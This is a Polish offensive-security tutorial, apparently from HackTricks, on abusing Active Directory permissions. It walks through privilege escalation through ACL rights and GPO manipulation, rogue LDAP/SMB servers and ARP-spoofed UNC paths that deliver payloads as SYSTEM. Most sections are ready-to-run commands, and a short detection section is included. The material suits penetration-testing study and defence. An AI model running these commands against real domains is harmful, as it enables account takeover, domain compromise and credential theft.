# Nadużywanie ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest głównie podsumowaniem technik opisanych w** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **oraz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Więcej informacji znajdziesz w oryginalnych artykułach.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Uprawnienia GenericAll do użytkownika**

To uprawnienie daje atakującemu pełną kontrolę nad kontem docelowego użytkownika. Po potwierdzeniu uprawnień `GenericAll` za pomocą polecenia `Get-ObjectAcl` atakujący może:

- **Zmienić hasło użytkownika docelowego**: za pomocą polecenia `net user <username> <password> /domain` atakujący może zresetować hasło użytkownika.
- W systemie Linux można zrobić to samo przez SAMR za pomocą Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Jeśli konto jest wyłączone, wyczyść flagę UAC**: `GenericAll` umożliwia edycję `userAccountControl`. W systemie Linux BloodyAD może usunąć flagę `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby stało się podatne na Kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić hashe ticket-granting ticket (TGT) i podjąć próbę ich złamania.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Wyłącz wstępne uwierzytelnianie dla użytkownika, narażając jego konto na ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Mając `GenericAll` do użytkownika, możesz dodać poświadczenie oparte na certyfikacie i uwierzytelnić się jako ten użytkownik bez zmiany jego hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Uprawnienia GenericAll do grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupach, jeśli ma on `GenericAll` do grupy takiej jak `Domain Admins`. Po ustaleniu nazwy wyróżniającej grupy za pomocą `Get-NetGroup` atakujący może:

- **Dodać się do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub modułów takich jak Active Directory albo PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Z Linuksa możesz również wykorzystać BloodyAD, aby dodać siebie do dowolnych grup, jeśli masz uprawnienia GenericAll/Write do zarządzania ich członkostwem. Jeśli grupa docelowa jest zagnieżdżona w „Remote Management Users”, natychmiast uzyskasz dostęp WinRM do hostów, które honorują tę grupę:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień do obiektu komputera lub konta użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: przejęcie obiektu komputera.
- **Shadow Credentials**: podszycie się pod konto komputera lub użytkownika przez wykorzystanie uprawnień do utworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma uprawnienia `WriteProperty` do wszystkich obiektów w określonej grupie (np. `Domain Admins`), może:

- **Dodanie siebie do grupy Domain Admins**: można to osiągnąć, łącząc polecenia `net user` i `Add-NetGroupUser`. Ta metoda umożliwia eskalację uprawnień w domenie.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) on Group**

To uprawnienie umożliwia atakującym dodawanie samych siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń bezpośrednio modyfikujących członkostwo w grupie. Poniższa sekwencja poleceń pozwala dodać samego siebie:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Podobne uprawnienie pozwala atakującym bezpośrednio dodawać siebie do grup poprzez modyfikowanie właściwości grup, jeśli mają do nich uprawnienie `WriteProperty`. Potwierdzenie i wykorzystanie tego uprawnienia wykonuje się za pomocą:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Posiadanie uprawnienia `ExtendedRight` do konta użytkownika w zakresie `User-Force-Change-Password` umożliwia resetowanie hasła bez znajomości aktualnego hasła. Weryfikację tego uprawnienia i jego wykorzystanie można przeprowadzić za pomocą PowerShella lub alternatywnych narzędzi wiersza poleceń. Dostępnych jest kilka metod resetowania hasła użytkownika, w tym za pośrednictwem sesji interaktywnych i jednolinijkowych poleceń w środowiskach nieinteraktywnych. Polecenia obejmują zarówno proste wywołania PowerShella, jak i użycie `rpcclient` w systemie Linux, co pokazuje różnorodność wektorów ataku.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner dla grupy**

Jeśli atakujący odkryje, że ma uprawnienia `WriteOwner` do grupy, może zmienić jej właściciela na siebie. Jest to szczególnie istotne, gdy chodzi o grupę `Domain Admins`, ponieważ zmiana właściciela daje szerszą kontrolę nad atrybutami grupy i jej członkostwem. Proces polega na zidentyfikowaniu właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner` do zmiany właściciela, podając jego SID lub nazwę.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite dla użytkownika**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt podczas logowania. Można to zrobić za pomocą polecenia `Set-ADObject`, aktualizując właściwość `scriptpath` docelowego użytkownika tak, aby wskazywała na skrypt atakującego.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Węższy wpis ACE `WriteProperty`, ograniczony do atrybutu [`scriptPath` użytkownika](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), może wystarczyć; `GenericWrite` nie jest wymagane. Połącz to uprawnienie do atrybutu z zapisywalnym skryptem w drzewie `SYSVOL\<domain>\scripts` lub `NETLOGON` domeny, a następnie oceń, czy docelowy użytkownik prawdopodobnie się zaloguje i uzyska dostęp do skryptu. Skrypt uruchamia się w kontekście tego użytkownika podczas logowania. Osobno sprawdź efektywne uprawnienia AD oraz ACL plików i udziałów; pasujący wpis ACE typu Allow lub sam zapisywalny katalog nie potwierdza kompletności całej ścieżki.

## **GenericWrite dla grupy**

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupie, na przykład dodawać do niej siebie lub innych użytkowników. Proces obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania użytkowników do grupy lub usuwania ich z niej oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Z Linuksa Samba `net` może dodawać/usuwać członków grupy, gdy masz `GenericWrite` do tej grupy (przydatne, gdy PowerShell/RSAT są niedostępne):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` do niego umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do tego obiektu. Można to zrobić poprzez manipulację ADSI, uzyskując pełną kontrolę nad obiektem i możliwość modyfikowania jego członkostwa w grupach. Istnieją jednak ograniczenia w przypadku próby wykorzystania tych uprawnień za pomocą poleceń cmdlet `Set-Acl` / `Get-Acl` z modułu Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Szybkie przejęcie przez WriteDACL/WriteOwner (PowerView)

Mając uprawnienia `WriteOwner` i `WriteDacl` do konta użytkownika lub usługi, możesz przejąć nad nim pełną kontrolę i zresetować jego hasło za pomocą PowerView, nie znając starego hasła:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Uwagi:
- Jeśli masz tylko `WriteOwner`, być może musisz najpierw zmienić właściciela na siebie:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Zweryfikuj dostęp za pomocą dowolnego protokołu (SMB/LDAP/RDP/WinRM) po zresetowaniu hasła.

## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje określone uprawnienia do replikacji w domenie, aby podszyć się pod kontroler domeny i zsynchronizować dane, w tym poświadczenia użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, które pozwalają atakującym wyodrębniać poufne informacje ze środowiska AD bez bezpośredniego dostępu do kontrolera domeny.<sup>[[5]](#references)</sup> [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## Delegowanie GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegowanie GPO

Delegowany dostęp do zarządzania obiektami zasad grupy (GPO) może stwarzać poważne zagrożenia dla bezpieczeństwa. Na przykład użytkownik taki jak `offense\spotless`, któremu delegowano uprawnienia do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Uprawnienia te można wykorzystać do złośliwych celów, co można wykryć za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Wyliczanie uprawnień GPO

Aby zidentyfikować błędnie skonfigurowane GPO, można połączyć ze sobą polecenia cmdlet PowerSploit. Pozwala to wykryć GPO, którymi dany użytkownik ma uprawnienia zarządzać: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery, do których zastosowano daną zasadę**: Można ustalić, do których komputerów odnosi się określone GPO, co ułatwia ocenę zakresu potencjalnych skutków. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Zasady zastosowane do danego komputera**: Aby sprawdzić, jakie zasady zastosowano do konkretnego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OU, do których zastosowano daną zasadę**: Jednostki organizacyjne (OU), których dotyczy dana zasada, można zidentyfikować za pomocą `Get-DomainOU`.

Do wyliczania GPO i wyszukiwania w nich problemów można również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Nadużycie GPO — New-GPOImmediateTask

Błędnie skonfigurowane GPO można wykorzystać do wykonania kodu, na przykład przez utworzenie natychmiastowego zaplanowanego zadania. Można w ten sposób dodać użytkownika do lokalnej grupy administratorów na komputerach objętych zasadą, znacznie podnosząc jego uprawnienia:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Moduł GroupPolicy - nadużywanie GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i łączenie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, aby uruchamiać backdoory na podatnych komputerach. Ta metoda wymaga zaktualizowania GPO i zalogowania się użytkownika na komputerze, aby doszło do wykonania:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Nadużywanie GPO

SharpGPOAbuse umożliwia nadużywanie istniejących GPO przez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO albo użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Wymuszanie aktualizacji zasad

Aktualizacje GPO zazwyczaj odbywają się co około 90 minut. Aby przyspieszyć ten proces, zwłaszcza po wprowadzeniu zmiany, na komputerze docelowym można użyć polecenia `gpupdate /force`, aby natychmiast wymusić aktualizację zasad. Polecenie to gwarantuje zastosowanie wszelkich modyfikacji GPO bez oczekiwania na kolejny cykl automatycznej aktualizacji.

### Pod maską

Po sprawdzeniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań, takich jak `evilTask`. Zadania te tworzy się za pomocą skryptów lub narzędzi wiersza poleceń, których celem jest zmiana zachowania systemu lub eskalacja uprawnień.

Struktura zadania przedstawiona w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask` określa szczegóły zaplanowanego zadania, w tym polecenie do wykonania i jego wyzwalacze. Plik ten pokazuje, jak definiuje się i zarządza zaplanowanymi zadaniami w GPO, umożliwiając wykonywanie dowolnych poleceń lub skryptów w ramach egzekwowania zasad.

### Użytkownicy i grupy

GPO umożliwiają także manipulowanie członkostwem użytkowników i grup w systemach docelowych. Edytując bezpośrednio pliki zasad Użytkownicy i grupy, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, które pozwala modyfikować pliki zasad, dodawać do nich nowych użytkowników lub zmieniać członkostwo w grupach.

Plik konfiguracyjny XML dla ustawień Użytkownicy i grupy pokazuje, jak wprowadza się te zmiany. Dodając wpisy do tego pliku, można przyznać określonym użytkownikom podwyższone uprawnienia we wszystkich objętych systemach. Metoda ta umożliwia bezpośrednią eskalację uprawnień przez manipulowanie GPO.

W przypadku ustawień zabezpieczeń, takich jak członkostwo w grupach lokalnych i prawa użytkowników, sprawdź również zastosowany szablon GPO pod ścieżką `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` oraz listę ACL katalogu `SecEdit`. Możliwość zapisu w katalogu lub pliku wskazuje, że warto go dokładniej sprawdzić: o tym, czy zmiana może odnieść skutek, decydują efektywny dostęp do udziału SYSVOL, reguły odmowy i dziedziczone wpisy ACL, uprawnienia kontenera Group Policy, zakres zasad oraz odświeżanie po stronie klienta. Samo członkostwo w grupie o nazwie „GPO Managers” nie potwierdza uprawnień do edycji. [Firma Microsoft dokumentuje tę ścieżkę szablonu oraz podział na kontener Group Policy i szablon.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Można także rozważyć inne metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystanie skryptów logowania i wylogowywania, modyfikowanie kluczy rejestru uruchamianych automatycznie, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług. Techniki te oferują różne sposoby utrzymywania dostępu i kontrolowania systemów docelowych przez nadużywanie GPO.

### Przekierowywanie pobierania GPC/GPT do uwierzytelnianych, nieautoryzowanych usług

GPO składa się z **Group Policy Container (GPC)** w LDAP, który zawiera metadane, oraz hostowanego przez SMB **Group Policy Template (GPT)** z plikami zasad. Podczas odświeżania klient odczytuje `gPLink` kontenera, pobiera wskazany GPC i jego `gPCFileSysPath`, a następnie pobiera GPT ze wskazanej ścieżki UNC. W konsekwencji dostęp do zapisu do samego GPC lub do `gPLink` jednostki OU, lokacji bądź domeny można wykorzystać do uruchomienia przetwarzania zasad z podwyższonymi uprawnieniami.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Zatruwanie `gPCFileSysPath` za pomocą GPOddity

Jeśli kontrolowana tożsamość może modyfikować docelowy GPC bezpośrednio lub przez **przekaźnik NTLM do LDAP**, zmień `gPCFileSysPath` na ścieżkę UNC hostowaną przez atakującego. [GPOddity](https://github.com/synacktiv/GPOddity) automatyzuje zmianę w LDAP i udostępnia złośliwy GPT zawierający pliki zasad oparte na modułach lub Immediate Task, które klient Group Policy wykonuje jako `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimowy udział SMB lub udział niewymagający określonych poświadczeń nie wystarczy w obecnych klientach Windows: SMB Secure Negotiate wymaga dowodu pomyślnego uwierzytelnienia, więc nieautoryzowana usługa musi zweryfikować tożsamość domenową, wyprowadzić klucz sesji SMB i prawidłowo podpisywać odpowiedzi. W trybie osadzonym skonfiguruj GPOddity przy użyciu kontrolowanego konta komputera i jego klucza usługi, a następnie wybierz ładunek po stronie komputera lub użytkownika w sekcji `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Przypadek brzegowy GPO użytkownika:** po MS16-072 Windows nadal tworzy dwie sesje SMB2 w ramach tego samego połączenia TCP: sesja użytkownika odczytuje `GPT.INI`, a następnie sesja konta komputera odczytuje efektywną konfigurację, taką jak `ScheduledTasks.xml`. Złośliwy serwer musi więc indeksować stan uwierzytelniania, klucze sesji i klucze podpisywania według `SessionId` SMB2, a nie tylko gniazda. Fork Scapy osadzony w GPOddity/OUned implementuje to za pomocą `SMBStreamSocketMultiplexing` i obsługującego multipleksowanie `SMBServer`; serwery Impacket/Scapy obsługujące tylko jedną sesję w przeciwnym razie ponownie używają niewłaściwego stanu podpisywania i nie obsługują poprawnie zasad użytkownika.<sup>[[15]](#references)</sup>

#### Zatruwanie `gPLink` za pomocą OUned

Mając uprawnienie `WriteGPLink`, `GenericWrite` lub równoważną kontrolę nad OU, witryną lub domeną, atakujący może dodać łącze, którego DN GPC jest obsługiwany przez kontrolowany przez atakującego host LDAP. Ten mechanizm został pierwotnie przedstawiony przez Petrosa Koutroumpisa; [OUned](https://github.com/synacktiv/OUned) automatyzuje zapis LDAP oraz tworzenie złośliwego łańcucha GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Ofiara najpierw uwierzytelnia się w nieautoryzowanej usłudze LDAP i otrzymuje GPC, którego `gPCFileSysPath` wskazuje na nieautoryzowaną usługę SMB; następnie uwierzytelnia się w SMB i stosuje dostarczony GPT. OUned potrzebuje więc konta z SPN LDAP, konta komputera z SPN HOST dla SMB (to samo konto komputera może spełniać oba wymagania) oraz konfiguracji DNS lub przekazywania zwrotnego, która kieruje porty 389 i 445 na host operatora.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Wbudowany serwer LDAP Scapy w OUned weryfikuje Kerberos/SPNEGO przy użyciu rzeczywistego klucza kontrolowanej usługi i udostępnia dowolne dane GPC z JSON. Pusty klucz JSON odwzorowuje rootDSE, prefiksy `base64:` oznaczają wartości binarne, a serwer obsługuje operacje add/delete/modify/search oraz wyszukiwania `BASE`, `LEVEL` i `SUBTREE`; może negocjować brak ochrony, integralność lub poufność. Dzięki temu usługa może być ponownie używana, gdy inny komponent Windows odwołuje się do kontrolowanego przez atakującego LDAP, ale wymaga uwierzytelnionego LDAP.<sup>[[15]](#references)</sup>

Nie zakładaj, że synchronizacja hasła konta z domeną testową odtwarza wszystkie klucze Kerberos: RC4 jest wyprowadzany z hasła, natomiast AES string-to-key używa również soli wyprowadzonej z nazwy hosta/domeny w principalu. Podanie rzeczywistego klucza AES konta do `KerberosSSP` pozwala uniknąć wymuszania RC4 przez wykrywalną zmianę `msDS-SupportedEncryptionTypes`, które konto komputera może modyfikować samodzielnie.<sup>[[15]](#references)</sup>

#### Wskazówki detekcyjne

Koreluj zmiany `gPCFileSysPath` lub `gPLink` ze zmianami wersji GPO i nowymi plikami XML z Immediate/Scheduled Task. Sprawdzaj odwołania do nieoczekiwanych kontekstów nazewniczych, hosty UNC spoza zatwierdzonego zestawu DC/SYSVOL, rekordy DNS przekierowujące nazwy kont komputerów, bilety usług LDAP/CIFS dla nietypowych kont komputerów oraz zmiany `msDS-SupportedEncryptionTypes` włączające RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` dla OU/domeny pozwala modyfikować atrybut `gPLink` kontenera docelowego i **wymusić zastosowanie istniejącego GPO** bez edytowania samego GPO. Jest to interesujące, gdy połączone GPO już odwołuje się do zdalnych zasobów przez **ścieżki UNC** (`\\HOST\share\...`), ponieważ uwierzytelnieni użytkownicy mogą odczytywać **SYSVOL** i offline szukać w nim możliwych do ponownego wykorzystania zasad.<sup>[[11]](#references)</sup>

Ogólny przebieg:

1. Użyj BloodHound, aby znaleźć principal z uprawnieniem `WriteGPLink` do OU oraz wyliczyć komputery/użytkowników w tej OU.
2. Sklonuj `SYSVOL` tylko do odczytu i przeanalizuj GPO w poszukiwaniu **Software Installation**, **mapowań dysków** (`Drives.xml`) oraz **skryptów logowania/uruchamiania**, które odwołują się do ścieżek UNC.
3. Preferuj zasady wskazujące **bezpośrednią nazwę hosta** (na przykład `\\DC02\share\pkg.msi`) zamiast ścieżek DFS/przestrzeni nazw domeny, ponieważ ścieżki oparte na nazwie hosta łatwiej przekierować za pomocą spoofingu L2.
4. Dodaj GUID wybranego GPO do `gPLink` docelowej OU, aby ofiara przetworzyła tę istniejącą już zasadę.
5. W tej samej domenie rozgłoszeniowej wykonaj ARP spoofing hosta UNC i lokalnie przypisz jego adres IP (`ip addr add <target_ip>/32 dev <iface>`), aby ruch SMB ofiary trafiał na twój host.
6. Udostępnij oczekiwaną ścieżkę/nazwę pliku na serwerze SMB atakującego (na przykład `smbserver.py`) i poczekaj na standardowe przetwarzanie zasad.

Przykład pobrania `SYSVOL` i korelacji GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Połącz istniejący obiekt GPO z docelową jednostką organizacyjną:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Hijack UNC w Software Installation -> SYSTEM

Jeśli podlinkowane GPO wdraża plik MSI ze ścieżki UNC, klient pobierze go podczas **uruchamiania komputera** i zainstaluje jako **`NT AUTHORITY\SYSTEM`**. Podszywając się pod wskazany host i udostępniając złośliwy plik MSI pod **tą samą nazwą udziału, ścieżką i nazwą pliku**, możesz wykorzystać `WriteGPLink` do uruchomienia kodu jako SYSTEM **bez modyfikowania SYSVOL**.

Ważne ograniczenia:

- **Liczy się czas**: nowy link zostanie wykryty podczas odświeżania zasad (zwykle po około 90 minutach), ale **Software Installation** zazwyczaj uruchamia się przy **ponownym uruchomieniu**.
- Windows Installer często śledzi wdrożenie za pomocą **`ProductCode`** pakietu. Jeśli produkt jest już zainstalowany, wdrożenie może zostać pominięte.
- Aby uniknąć odrzucenia przez instalator, zmodyfikuj nieautoryzowany plik MSI tak, aby jego **`ProductCode`** i **`PackageCode`** były zgodne z kodami oczekiwanego przez GPO legalnego pakietu.
- W plikach `SYSVOL` mogą pozostać stare pliki reklamowe `.aas`, dlatego przed podjęciem działań upewnij się, że wdrożenie nadal wygląda na aktywne.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> przechwycenie NTLM / WebDAV relay

Mapowania dysków GPP w `Drives.xml` powodują, że podczas logowania lub ponownego łączenia użytkownicy uwierzytelniają się wobec skonfigurowanej ścieżki UNC. Jeśli podszyjesz się pod wskazany host, możesz przechwycić **NetNTLMv2**. Jeśli celowo doprowadzisz do niepowodzenia SMB, Windows może ponowić próbę przez **WebDAV**, wysyłając **NTLM przez HTTP**. Jest to znacznie bardziej elastyczne w przypadku relay do **LDAP(S)**, **AD CS** lub **SMB**.

#### Logon/startup script UNC hijack

Ten sam mechanizm dotyczy skryptów hostowanych pod ścieżkami UNC, znalezionych w `SYSVOL`:

- **Logon scripts** zwykle są uruchamiane w kontekście **użytkownika**.
- **Startup scripts** zwykle są uruchamiane w kontekście **komputera / SYSTEM**.

Jeśli ścieżka skryptu wskazuje na nazwę hosta, pod którą można się podszyć, przekieruj hosta UNC i udostępnij zastępczą zawartość skryptu w oczekiwanej lokalizacji.

## Zatruwanie skryptów logowania SYSVOL/NETLOGON

Zapisywalne ścieżki w `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` pozwalają modyfikować skrypty logowania uruchamiane podczas logowania użytkownika przez GPO. Umożliwia to wykonanie kodu w kontekście bezpieczeństwa logujących się użytkowników.

### Lokalizowanie skryptów logowania
- Sprawdź atrybuty użytkownika pod kątem skonfigurowanego skryptu logowania:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Przeszukaj udziały domenowe, aby znaleźć skróty lub odwołania do skryptów:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analizuj pliki `.lnk`, aby rozwiązać ścieżki docelowe prowadzące do SYSVOL/NETLOGON (przydatna sztuczka DFIR i dla atakujących bez bezpośredniego dostępu do GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound wyświetla atrybut skryptu logowania `scriptPath` obiektu użytkownika, jeśli jest ustawiony. Skrypty logowania skonfigurowane w GPO są osobnym odwołaniem do zasad, dlatego sprawdź również odpowiednie GPO.

### Weryfikacja dostępu do zapisu (nie ufaj listom udziałów)
